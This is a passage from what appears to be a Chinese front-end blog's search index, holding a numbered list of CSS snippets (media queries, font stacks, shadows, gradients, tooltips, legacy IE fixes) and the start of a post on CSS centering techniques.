-webkit-border-top-left-radius: 4px;    -webkit-border-top-right-radius: 3px;    -webkit-border-bottom-right-radius: 6px;    -webkit-border-bottom-left-radius: 10px;    -moz-border-radius-topleft: 4px;    -moz-border-radius-topright: 3px;    -moz-border-radius-bottomright: 6px;    -moz-border-radius-bottomleft: 10px;&#125;\n\n17、通用媒体查询\n/* Smartphones (portrait and landscape) ----------- */@media only screen and (min-device-width : 320px) and (max-device-width : 480px) &#123;  /* Styles */&#125;/* Smartphones (landscape) ----------- */@media only screen and (min-width : 321px) &#123;  /* Styles */&#125;/* Smartphones (portrait) ----------- */@media only screen and (max-width : 320px) &#123;  /* Styles */&#125;/* iPads (portrait and landscape) ----------- */@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) &#123;  /* Styles */&#125;/* iPads (landscape) ----------- */@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : landscape) &#123;  /* Styles */&#125;/* iPads (portrait) ----------- */@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : portrait) &#123;  /* Styles */&#125;/* Desktops and laptops ----------- */@media only screen and (min-width : 1224px) &#123;  /* Styles */&#125;/* Large screens ----------- */@media only screen and (min-width : 1824px) &#123;  /* Styles */&#125;/* iPhone 4 ----------- */@media only screen and (-webkit-min-device-pixel-ratio:1.5), only screen and (min-device-pixel-ratio:1.5) &#123;  /* Styles */&#125;\n\n18、现代字体栈\n/* Times New Roman-based serif */font-family: Cambria, &quot;Hoefler Text&quot;, Utopia, &quot;Liberation Serif&quot;, &quot;Nimbus Roman No9 L Regular&quot;, Times, &quot;Times New Roman&quot;, serif;/* A modern Georgia-based serif */font-family: Constantia, &quot;Lucida Bright&quot;, Lucidabright, &quot;Lucida Serif&quot;, Lucida, &quot;DejaVu Serif,&quot; &quot;Bitstream Vera Serif&quot;, &quot;Liberation Serif&quot;, Georgia, serif;/*A more traditional Garamond-based serif */font-family: &quot;Palatino Linotype&quot;, Palatino, Palladio, &quot;URW Palladio L&quot;, &quot;Book Antiqua&quot;, Baskerville, &quot;Bookman Old Style&quot;, &quot;Bitstream Charter&quot;, &quot;Nimbus Roman No9 L&quot;, Garamond, &quot;Apple Garamond&quot;, &quot;ITC Garamond Narrow&quot;, &quot;New Century Schoolbook&quot;, &quot;Century Schoolbook&quot;, &quot;Century Schoolbook L&quot;, Georgia, serif;/*The Helvetica/Arial-based sans serif */font-family: Frutiger, &quot;Frutiger Linotype&quot;, Univers, Calibri, &quot;Gill Sans&quot;, &quot;Gill Sans MT&quot;, &quot;Myriad Pro&quot;, Myriad, &quot;DejaVu Sans Condensed&quot;, &quot;Liberation Sans&quot;, &quot;Nimbus Sans L&quot;, Tahoma, Geneva, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;/*The Verdana-based sans serif */font-family: Corbel, &quot;Lucida Grande&quot;, &quot;Lucida Sans Unicode&quot;, &quot;Lucida Sans&quot;, &quot;DejaVu Sans&quot;, &quot;Bitstream Vera Sans&quot;, &quot;Liberation Sans&quot;, Verdana, &quot;Verdana Ref&quot;, sans-serif;/*The Trebuchet-based sans serif */font-family: &quot;Segoe UI&quot;, Candara, &quot;Bitstream Vera Sans&quot;, &quot;DejaVu Sans&quot;, &quot;Bitstream Vera Sans&quot;, &quot;Trebuchet MS&quot;, Verdana, &quot;Verdana Ref&quot;, sans-serif;/*The heavier &quot;Impact&quot; sans serif */font-family: Impact, Haettenschweiler, &quot;Franklin Gothic Bold&quot;, Charcoal, &quot;Helvetica Inserat&quot;, &quot;Bitstream Vera Sans Bold&quot;, &quot;Arial Black&quot;, sans-serif;/*The monospace */font-family: Consolas, &quot;Andale Mono WT&quot;, &quot;Andale Mono&quot;, &quot;Lucida Console&quot;, &quot;Lucida Sans Typewriter&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Bitstream Vera Sans Mono&quot;, &quot;Liberation Mono&quot;, &quot;Nimbus Mono L&quot;, Monaco, &quot;Courier New&quot;, Courier, monospace;\n\n19、自定义文本选择\n::selection &#123; background: #e2eae2; &#125;::-moz-selection &#123; background: #e2eae2; &#125;::-webkit-selection &#123; background: #e2eae2; &#125;\n\n20、为logo隐藏H1\nh1 &#123;    text-indent: -9999px;    margin: 0 auto;    width: 320px;    height: 85px;    background: transparent url(&quot;images/logo.png&quot;) no-repeat scroll;&#125;\n\n21、图片边框偏光\nimg.polaroid &#123;    background:#000; /*Change this to a background image or remove*/    border:solid #fff;    border-width:6px 6px 20px 6px;    box-shadow:1px 1px 5px #333; /* Standard blur at 5px. Increase for more depth */    -webkit-box-shadow:1px 1px 5px #333;    -moz-box-shadow:1px 1px 5px #333;    height:200px; /*Set to height of your image or desired div*/    width:200px; /*Set to width of your image or desired div*/&#125;\n\n22、锚链接伪类\na:link &#123; color: blue; &#125;a:visited &#123; color: purple; &#125;a:hover &#123; color: red; &#125;a:active &#123; color: yellow; &#125;\n\n23、奇特的CSS引用\n.has-pullquote:before &#123;    /* Reset metrics. */    padding: 0;    border: none;    /* Content */    content: attr(data-pullquote);    /* Pull out to the right, modular scale based margins. */    float: right;    width: 320px;    margin: 12px -140px 24px 36px;    /* Baseline correction */    position: relative;    top: 5px;    /* Typography (30px line-height equals 25% incremental leading) */    font-size: 23px;    line-height: 30px;&#125;.pullquote-adelle:before &#123;    font-family: &quot;adelle-1&quot;, &quot;adelle-2&quot;;    font-weight: 100;    top: 10px !important;&#125;.pullquote-helvetica:before &#123;    font-family: &quot;Helvetica Neue&quot;, Arial, sans-serif;    font-weight: bold;    top: 7px !important;&#125;.pullquote-facit:before &#123;    font-family: &quot;facitweb-1&quot;, &quot;facitweb-2&quot;, Helvetica, Arial, sans-serif;    font-weight: bold;    top: 7px !important;&#125;\n\n24、CSS3：全屏背景\nhtml &#123;     background: url(&#x27;images/bg.jpg&#x27;) no-repeat center center fixed;     -webkit-background-size: cover;    -moz-background-size: cover;    -o-background-size: cover;    background-size: cover;&#125;\n\n25、内容垂直居中\n.container &#123;    min-height: 6.5em;    display: table-cell;    vertical-align: middle;&#125;\n\n26、强制出现垂直滚动条\nhtml &#123; height: 101% &#125;\n\n27、CSS3渐变模板\n#colorbox &#123;    background: #629721;    background-image: -webkit-gradient(linear, left top, left bottom, from(#83b842), to(#629721));    background-image: -webkit-linear-gradient(top, #83b842, #629721);    background-image: -moz-linear-gradient(top, #83b842, #629721);    background-image: -ms-linear-gradient(top, #83b842, #629721);    background-image: -o-linear-gradient(top, #83b842, #629721);    background-image: linear-gradient(top, #83b842, #629721);&#125;\n\n28、@font-face模板\n@font-face &#123;    font-family: &#x27;MyWebFont&#x27;;    src: url(&#x27;webfont.eot&#x27;); /* IE9 Compat Modes */    src: url(&#x27;webfont.eot?#iefix&#x27;) format(&#x27;embedded-opentype&#x27;), /* IE6-IE8 */    url(&#x27;webfont.woff&#x27;) format(&#x27;woff&#x27;), /* Modern Browsers */    url(&#x27;webfont.ttf&#x27;)  format(&#x27;truetype&#x27;), /* Safari, Android, iOS */    url(&#x27;webfont.svg#svgFontName&#x27;) format(&#x27;svg&#x27;); /* Legacy iOS */&#125;body &#123;    font-family: &#x27;MyWebFont&#x27;, Arial, sans-serif;&#125;\n\n29、缝合CSS3元素\np &#123;    position:relative;    z-index:1;    padding: 10px;    margin: 10px;    font-size: 21px;    line-height: 1.3em;    color: #fff;    background: #ff0030;    -webkit-box-shadow: 0 0 0 4px #ff0030, 2px 1px 4px 4px rgba(10,10,0,.5);    -moz-box-shadow: 0 0 0 4px #ff0030, 2px 1px 4px 4px rgba(10,10,0,.5);    box-shadow: 0 0 0 4px #ff0030, 2px 1px 6px 4px rgba(10,10,0,.5);    -webkit-border-radius: 3px;    -moz-border-radius: 3px;    border-radius: 3px;&#125;p:before &#123;    content: &quot;&quot;;    position: absolute;    z-index: -1;    top: 3px;    bottom: 3px;    left :3px;    right: 3px;    border: 2px dashed #fff;&#125;p a &#123;    color: #fff;    text-decoration:none;&#125;p a:hover, p a:focus, p a:active &#123;    text-decoration:underline;&#125;\n\n30、CSS3 斑马线\ntbody tr:nth-child(odd) &#123;    background-color: #ccc;&#125;\n\n31、有趣的&amp;\n.amp &#123;    font-family: Baskerville, &#x27;Goudy Old Style&#x27;, Palatino, &#x27;Book Antiqua&#x27;, serif;    font-style: italic;    font-weight: normal;&#125;\n\n32、大字段落\np:first-letter&#123;    display: block;    margin: 5px 0 0 5px;    float: left;    color: #ff3366;    font-size: 5.4em;    font-family: Georgia, Times New Roman, serif;&#125;\n\n33、内部CSS3 盒阴影\n#mydiv &#123;     -moz-box-shadow: inset 2px 0 4px #000;    -webkit-box-shadow: inset 2px 0 4px #000;    box-shadow: inset 2px 0 4px #000;&#125;\n\n34、外部CSS3 盒阴影\n#mydiv &#123;     -webkit-box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52);    -moz-box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52);    box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52);&#125;\n\n35、三角形列表项目符号\nul &#123;    margin: 0.75em 0;    padding: 0 1em;    list-style: none;&#125;li:before &#123;     content: &quot;&quot;;    border-color: transparent #111;    border-style: solid;    border-width: 0.35em 0 0.35em 0.45em;    display: block;    height: 0;    width: 0;    left: -1em;    top: 0.9em;    position: relative;&#125;\n\n36、固定宽度的居中布局\n#page-wrap &#123;    width: 800px;    margin: 0 auto;&#125;\n\n37、CSS3 列文本\n#columns-3 &#123;    text-align: justify;    -moz-column-count: 3;    -moz-column-gap: 12px;    -moz-column-rule: 1px solid #c4c8cc;    -webkit-column-count: 3;    -webkit-column-gap: 12px;    -webkit-column-rule: 1px solid #c4c8cc;&#125;\n\n38、CSS固定页脚\n#footer &#123;    position: fixed;    left: 0px;    bottom: 0px;    height: 30px;    width: 100%;    background: #444;&#125;/* IE 6 */* html #footer &#123;    position: absolute;    top: expression((0-(footer.offsetHeight)+(document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body.clientHeight)+(ignoreMe = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop))+&#x27;px&#x27;);&#125;\n\n39、IE6的PNG透明修复\n.bg &#123;    width:200px;    height:100px;    background: url(/folder/yourimage.png) no-repeat;    _background:none;    _filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&#x27;/folder/yourimage.png&#x27;,sizingMethod=&#x27;crop&#x27;);&#125;/* 1px gif method */img, .png &#123;    position: relative;    behavior: expression((this.runtimeStyle.behavior=&quot;none&quot;)&amp;&amp;(this.pngSet?this.pngSet=true:(this.nodeName == &quot;IMG&quot; &amp;&amp; this.src.toLowerCase().indexOf(&#x27;.png&#x27;)&gt;-1?(this.runtimeStyle.backgroundImage = &quot;none&quot;,       this.runtimeStyle.filter = &quot;progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&#x27;&quot; + this.src + &quot;&#x27;, sizingMethod=&#x27;image&#x27;)&quot;,       this.src = &quot;images/transparent.gif&quot;):(this.origBg = this.origBg? this.origBg :this.currentStyle.backgroundImage.toString().replace(&#x27;url(&quot;&#x27;,&#x27;&#x27;).replace(&#x27;&quot;)&#x27;,&#x27;&#x27;),       this.runtimeStyle.filter = &quot;progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&#x27;&quot; + this.origBg + &quot;&#x27;, sizingMethod=&#x27;crop&#x27;)&quot;,       this.runtimeStyle.backgroundImage = &quot;none&quot;)),this.pngSet=true));&#125;\n\n40、跨浏览器设置最小高度\n#container &#123;    min-height: 550px;    height: auto !important;    height: 550px;&#125;\n\n41、CSS3 鲜艳的输入\ninput[type=text], textarea &#123;    -webkit-transition: all 0.30s ease-in-out;    -moz-transition: all 0.30s ease-in-out;    -ms-transition: all 0.30s ease-in-out;    -o-transition: all 0.30s ease-in-out;    outline: none;    padding: 3px 0px 3px 3px;    margin: 5px 1px 3px 0px;    border: 1px solid #ddd;&#125;input[type=text]:focus, textarea:focus &#123;    box-shadow: 0 0 5px rgba(81, 203, 238, 1);    padding: 3px 0px 3px 3px;    margin: 5px 1px 3px 0px;    border: 1px solid rgba(81, 203, 238, 1);&#125;\n\n42、基于文件类型的链接样式\n/* external links */a[href^=&quot;http://&quot;] &#123;    padding-right: 13px;    background: url(&#x27;external.gif&#x27;) no-repeat center right;&#125;/* emails */a[href^=&quot;mailto:&quot;] &#123;    padding-right: 20px;    background: url(&#x27;email.png&#x27;) no-repeat center right;&#125;/* pdfs */a[href$=&quot;.pdf&quot;] &#123;    padding-right: 18px;    background: url(&#x27;acrobat.png&#x27;) no-repeat center right;&#125;\n\n43、强制换行\npre &#123;    white-space: pre-wrap;       /* css-3 */    white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */    white-space: -pre-wrap;      /* Opera 4-6 */    white-space: -o-pre-wrap;    /* Opera 7 */    word-wrap: break-word;       /* Internet Explorer 5.5+ */&#125;\n\n44、在可点击的项目上强制手型\na[href], input[type=&#x27;submit&#x27;], input[type=&#x27;image&#x27;], label[for], select, button, .pointer &#123;    cursor: pointer;&#125;\n\n45、网页顶部盒阴影\nbody:before &#123;    content: &quot;&quot;;    position: fixed;    top: -10px;    left: 0;    width: 100%;    height: 10px;    -webkit-box-shadow: 0px 0px 10px rgba(0,0,0,.8);    -moz-box-shadow: 0px 0px 10px rgba(0,0,0,.8);    box-shadow: 0px 0px 10px rgba(0,0,0,.8);    z-index: 100;&#125;\n\n46、CSS3对话气泡\n.chat-bubble &#123;    background-color: #ededed;    border: 2px solid #666;    font-size: 35px;    line-height: 1.3em;    margin: 10px auto;    padding: 10px;    position: relative;    text-align: center;    width: 300px;    -moz-border-radius: 20px;    -webkit-border-radius: 20px;    -moz-box-shadow: 0 0 5px #888;    -webkit-box-shadow: 0 0 5px #888;    font-family: &#x27;Bangers&#x27;, arial, serif; &#125;.chat-bubble-arrow-border &#123;    border-color: #666 transparent transparent transparent;    border-style: solid;    border-width: 20px;    height: 0;    width: 0;    position: absolute;    bottom: -42px;    left: 30px;&#125;.chat-bubble-arrow &#123;    border-color: #ededed transparent transparent transparent;    border-style: solid;    border-width: 20px;    height: 0;    width: 0;    position: absolute;    bottom: -39px;    left: 30px;&#125;\n\n47、H1-H5默认样式\nh1,h2,h3,h4,h5&#123;    color: #005a9c;&#125;h1&#123;    font-size: 2.6em;    line-height: 2.45em;&#125;h2&#123;    font-size: 2.1em;    line-height: 1.9em;&#125;h3&#123;    font-size: 1.8em;    line-height: 1.65em;&#125;h4&#123;    font-size: 1.65em;    line-height: 1.4em;&#125;h5&#123;    font-size: 1.4em;    line-height: 1.25em;&#125;\n\n48、纯CSS背景噪音\nbody &#123;    background-image: url(data:image/png;base64,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);    background-color: #0094d0;&#125;\n\n49、持久的列表排序\nol.chapters &#123;    list-style: none;    margin-left: 0;&#125;ol.chapters &gt; li:before &#123;    content: counter(chapter) &quot;. &quot;;    counter-increment: chapter;    font-weight: bold;    float: left;    width: 40px;&#125;ol.chapters li &#123;    clear: left;&#125;ol.start &#123;    counter-reset: chapter;&#125;ol.continue &#123;    counter-reset: chapter 11;&#125;\n\n50、CSS悬浮提示文本\na &#123;     border-bottom:1px solid #bbb;    color:#666;    display:inline-block;    position:relative;    text-decoration:none;&#125;a:hover,a:focus &#123;    color:#36c;&#125;a:active &#123;    top:1px; &#125;/* Tooltip styling */a[data-tooltip]:after &#123;    border-top: 8px solid #222;    border-top: 8px solid hsla(0,0%,0%,.85);    border-left: 8px solid transparent;    border-right: 8px solid transparent;    content: &quot;&quot;;    display: none;    height: 0;    width: 0;    left: 25%;    position: absolute;&#125;a[data-tooltip]:before &#123;    background: #222;    background: hsla(0,0%,0%,.85);    color: #f6f6f6;    content: attr(data-tooltip);    display: none;    font-family: sans-serif;    font-size: 14px;    height: 32px;    left: 0;    line-height: 32px;    padding: 0 15px;    position: absolute;    text-shadow: 0 1px 1px hsla(0,0%,0%,1);    white-space: nowrap;    -webkit-border-radius: 5px;    -moz-border-radius: 5px;    -o-border-radius: 5px;    border-radius: 5px;&#125;a[data-tooltip]:hover:after &#123;    display: block;    top: -9px;&#125;a[data-tooltip]:hover:before &#123;    display: block;    top: -41px;&#125;a[data-tooltip]:active:after &#123;    top: -10px;&#125;a[data-tooltip]:active:before &#123;    top: -42px;&#125;\n\n51、深灰色的圆形按钮\n.graybtn &#123;    -moz-box-shadow:inset 0px 1px 0px 0px #ffffff;    -webkit-box-shadow:inset 0px 1px 0px 0px #ffffff;    box-shadow:inset 0px 1px 0px 0px #ffffff;    background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #ffffff), color-stop(1, #d1d1d1) );    background:-moz-linear-gradient( center top, #ffffff 5%, #d1d1d1 100% );    filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=&#x27;#ffffff&#x27;, endColorstr=&#x27;#d1d1d1&#x27;);    background-color:#ffffff;    -moz-border-radius:6px;    -webkit-border-radius:6px;    border-radius:6px;    border:1px solid #dcdcdc;    display:inline-block;    color:#777777;    font-family:arial;    font-size:15px;    font-weight:bold;    padding:6px 24px;    text-decoration:none;    text-shadow:1px 1px 0px #ffffff;&#125;.graybtn:hover &#123;    background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #d1d1d1), color-stop(1, #ffffff) );    background:-moz-linear-gradient( center top, #d1d1d1 5%, #ffffff 100% );    filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=&#x27;#d1d1d1&#x27;, endColorstr=&#x27;#ffffff&#x27;);    background-color:#d1d1d1;&#125;.graybtn:active &#123;    position:relative;    top:1px;&#125;\n\n52、在可打印的网页中显示URLs\n@media print   &#123;    a:after &#123;      content: &quot; [&quot; attr(href) &quot;] &quot;;    &#125;  &#125;\n\n53、禁用移动Webkit的选择高亮\nbody &#123;    -webkit-touch-callout: none;    -webkit-user-select: none;    -khtml-user-select: none;    -moz-user-select: none;    -ms-user-select: none;    user-select: none;&#125;\n\n54、CSS3 圆点图案\nbody &#123;    background: radial-gradient(circle, white 10%, transparent 10%),    radial-gradient(circle, white 10%, black 10%) 50px 50px;    background-size: 100px 100px;&#125;\n\n55、CSS3 方格图案\nbody &#123;    background-color: white;    background-image: linear-gradient(45deg, black 25%, transparent 25%, transparent 75%, black 75%, black),     linear-gradient(45deg, black 25%, transparent 25%, transparent 75%, black 75%, black);    background-size: 100px 100px;    background-position: 0 0, 50px 50px;&#125;\n\n56、Github的fork色带\n.ribbon &#123;    background-color: #a00;    overflow: hidden;    /* top left corner */    position: absolute;    left: -3em;    top: 2.5em;    /* 45 deg ccw rotation */    -moz-transform: rotate(-45deg);    -webkit-transform: rotate(-45deg);    /* shadow */    -moz-box-shadow: 0 0 1em #888;    -webkit-box-shadow: 0 0 1em #888;&#125;.ribbon a &#123;    border: 1px solid #faa;    color: #fff;    display: block;    font: bold 81.25% &#x27;Helvetiva Neue&#x27;, Helvetica, Arial, sans-serif;    margin: 0.05em 0 0.075em 0;    padding: 0.5em 3.5em;    text-align: center;    text-decoration: none;    /* shadow */    text-shadow: 0 0 0.5em #444;&#125;\n\n57、CSS font属性缩写\np &#123;  font: italic small-caps bold 1.2em/1.0em Arial, Tahoma, Helvetica;&#125;\n\n58、论文页面的卷曲效果\nul.box &#123;    position: relative;    z-index: 1; /* prevent shadows falling behind containers with backgrounds */    overflow: hidden;    list-style: none;    margin: 0;    padding: 0; &#125;ul.box li &#123;    position: relative;    float: left;    width: 250px;    height: 150px;    padding: 0;    border: 1px solid #efefef;    margin: 0 30px 30px 0;    background: #fff;    -webkit-box-shadow: 0 1px 4px rgba(0, 0, 0, 0.27), 0 0 40px rgba(0, 0, 0, 0.06) inset;    -moz-box-shadow: 0 1px 4px rgba(0, 0, 0, 0.27), 0 0 40px rgba(0, 0, 0, 0.06) inset;     box-shadow: 0 1px 4px rgba(0, 0, 0, 0.27), 0 0 40px rgba(0, 0, 0, 0.06) inset; &#125;ul.box li:before,ul.box li:after &#123;    content: &#x27;&#x27;;    z-index: -1;    position: absolute;    left: 10px;    bottom: 10px;    width: 70%;    max-width: 300px; /* avoid rotation causing ugly appearance at large container widths */    max-height: 100px;    height: 55%;    -webkit-box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);    -moz-box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);    -webkit-transform: skew(-15deg) rotate(-6deg);    -moz-transform: skew(-15deg) rotate(-6deg);    -ms-transform: skew(-15deg) rotate(-6deg);    -o-transform: skew(-15deg) rotate(-6deg);    transform: skew(-15deg) rotate(-6deg); &#125;ul.box li:after &#123;    left: auto;    right: 10px;    -webkit-transform: skew(15deg) rotate(6deg);    -moz-transform: skew(15deg) rotate(6deg);    -ms-transform: skew(15deg) rotate(6deg);    -o-transform: skew(15deg) rotate(6deg);    transform: skew(15deg) rotate(6deg); &#125;\n\n59、鲜艳的锚链接\na &#123;    color: #00e;&#125;a:visited &#123;    color: #551a8b;&#125;a:hover &#123;    color: #06e;&#125;a:focus &#123;    outline: thin dotted;&#125;a:hover, a:active &#123;    outline: 0;&#125;a, a:visited, a:active &#123;    text-decoration: none;    color: #fff;    -webkit-transition: all .3s ease-in-out;&#125;a:hover, .glow &#123;    color: #ff0;    text-shadow: 0 0 10px #ff0;&#125;\n\n60、带CSS3特色的横幅显示\n.featureBanner &#123;    position: relative;    margin: 20px&#125;.featureBanner:before &#123;    content: &quot;Featured&quot;;    position: absolute;    top: 5px;    left: -8px;    padding-right: 10px;    color: #232323;    font-weight: bold;    height: 0px;    border: 15px solid #ffa200;    border-right-color: transparent;    line-height: 0px;    box-shadow: -0px 5px 5px -5px #000;    z-index: 1;&#125;.featureBanner:after &#123;    content: &quot;&quot;;    position: absolute;    top: 35px;    left: -8px;    border: 4px solid #89540c;    border-left-color: transparent;    border-bottom-color: transparent;&#125;","categories":["前端"],"tags":["css"]},{"title":"css-居中","url":"/2018/02/28/html+css+js+ts/2-css%E5%B1%85%E4%B8%AD/","content":"水平居中方案\n方案一：text-align + inline-block\n&lt;div id=&quot;parent1&quot;&gt;\t&lt;div class=&quot;child&quot;&gt;水平居中&lt;/div&gt;&lt;/div&gt;#parent1&#123;\ttext-align: center;\tbackground:#ddd;\tmargin-bottom:20px;&#125;#parent1 .child&#123;\tdisplay: inline-block;\tbackground:#666;\tcolor:#fff;&#125;\n\n\n\n方案二：margin：0 auto\n&lt;div id=&quot;parent2&quot;&gt;\t&lt;div class=&quot;child&quot;&gt;水平居中&lt;/div&gt;&lt;/div&gt;#parent2&#123;\ttext-align: center;\tbackground:#ddd;\tmargin-bottom:20px;&#125;#parent2 .child&#123;\tdisplay: table;\tmargin: 0 auto;\tbackground:#666;\tcolor:#fff;&#125;\n\n方案三：absolute+transform)\n&lt;div id=&quot;parent3&quot;&gt;\t&lt;div class=&quot;child&quot;&gt;水平居中&lt;/div&gt;&lt;/div&gt;#parent3&#123;\tposition: relative;\tbackground:#ddd;\tmargin-bottom:20px;&#125;#parent3 .child&#123;\tposition: absolute;\tleft: 50%;\ttransform: translateX(-50%);\tbackground:#666;\tcolor:#fff;&#125;\n\n方案四：justify-content\n&lt;div id=&quot;parent4&quot;&gt;\t&lt;div class=&quot;child&quot;&gt;水平居中&lt;/div&gt;&lt;/div&gt;#parent4&#123;\tdisplay: flex;\tjustify-content: center;\tbackground:#ddd;\tmargin-bottom:20px;&#125;#parent4 .child&#123;\tmargin:0 auto;\tbackground:#666;\tcolor:#fff;&#125;\n\n垂直居中方案\n方案一： 利用 line-height 实现垂直居中\n\n这种方法适用于单行文本垂直居中,如果文本内容太长，出现了换行，换行后的内容会溢出\n\n&lt;div id=&quot;example1&quot;&gt;    单行文字垂直居中&lt;/div&gt;#example1 &#123;    height: 100px;    line-height: 100px;    background: #161616;    color: #fff;    width: 200px;&#125;\n\n方案二 利用 display: table 实现垂直居中\n&lt;div id=&quot;example2&quot;&gt;    &lt;div class=&quot;inner&quot;&gt;块区域垂直居中&lt;/div&gt;&lt;/div&gt;#example2 &#123;    height: 100px;    background: #161616;    color: #fff;    width: 400px;    overflow: hidden;    display: table;\t\t\tmargin-bottom:20px;&#125;#example2 .inner&#123;    display: table-cell;    vertical-align: middle;    height: 50px;    background:#999;&#125;\n\n方案三 margin 填充 这种方法需要知道内外容器的大小\n&lt;div id=&quot;example3&quot;&gt;    &lt;div class=&quot;inner&quot;&gt;块区域垂直居中&lt;/div&gt;&lt;/div&gt;#example3 &#123;    height: 100px;    background: #161616;    color: #fff;    width: 400px;    overflow: hidden;\t\t\tmargin-bottom:20px;&#125;#example3 .inner&#123;    margin-left: auto;    margin-right: auto;    margin-top: calc((100px - 50px)/2);    height: 50px;    background:#999;&#125;\n\n方案四：经典 absolute 布局上下文垂直居中\n&lt;div id=&quot;example4&quot;&gt;    &lt;div class=&quot;inner&quot;&gt;块区域垂直居中&lt;/div&gt;&lt;/div&gt;#example4 &#123;    width: 400px;    height: 100px;    background: #161616;    color: #fff;    position: relative;\t\tmargin-bottom:20px;&#125;#example4 .inner&#123;    height: 50px;    width: 200px;    position: absolute;    left: 50%;    top: 50%;    margin-top: -25px;    margin-left: -100px;    background:#999;&#125;\n\n方案五：absolute+transform\n&lt;div id=&quot;example5&quot;&gt;    &lt;div class=&quot;inner&quot;&gt;块区域垂直居中&lt;/div&gt;&lt;/div&gt;#example5 &#123;    width: 400px;    height: 100px;    background: #161616;    color: #fff;    position: relative;\tmargin-bottom:20px;&#125;#example5 .inner&#123;    position: absolute;    left: 50%;    top: 50%;    background: #999;    transform: translateX(-50%) translateY(-50%);&#125;\n\n方案六 利用margin：auto 居中\n&lt;div id=&quot;expample6&quot;&gt;    &lt;div class=&quot;inner&quot;&gt;Content here&lt;/div&gt;&lt;/div&gt;#expample6 &#123;    width: 400px;    height: 100px;    background: #eee;    position: relative;\t\tmargin-bottom:20px;&#125;#expample6 .inner &#123;    position: absolute;    